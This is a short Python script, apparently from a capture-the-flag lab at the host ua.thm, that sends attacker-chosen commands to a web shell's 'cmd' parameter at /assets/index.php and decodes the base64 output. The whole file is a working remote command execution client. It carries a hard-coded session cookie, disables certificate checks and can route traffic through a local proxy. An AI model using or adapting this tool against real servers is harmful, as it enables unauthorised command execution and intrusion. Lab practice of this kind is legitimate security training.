import requests
import base64
import argparse

def send_command(command, use_proxy=False):
    url = f"http://ua.thm/assets/index.php?cmd={command}"
    
    headers = {
        "Host": "ua.thm",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
        "Cookie": "PHPSESSID=ur4a9qgpqguqiki9vrs7d9umsg",
        "Connection": "keep-alive"
    }

    proxies = {
        "http": "http://localhost:8111",
        "https": "http://localhost:8111"
    } if use_proxy else None

    try:
        response = requests.get(url, headers=headers, proxies=proxies, verify=False, timeout=5)
        response.raise_for_status()
        decoded = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
        print(f"[+] Decoded output:\n{decoded}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Send RCE command, decode base64 result.")
    parser.add_argument("cmd", help="Command to execute remotely (e.g. id, whoami, uname -a)")
    parser.add_argument("--proxy", action="store_true", help="Route traffic through localhost:8111")
    args = parser.parse_args()

    send_command(args.cmd, use_proxy=args.proxy)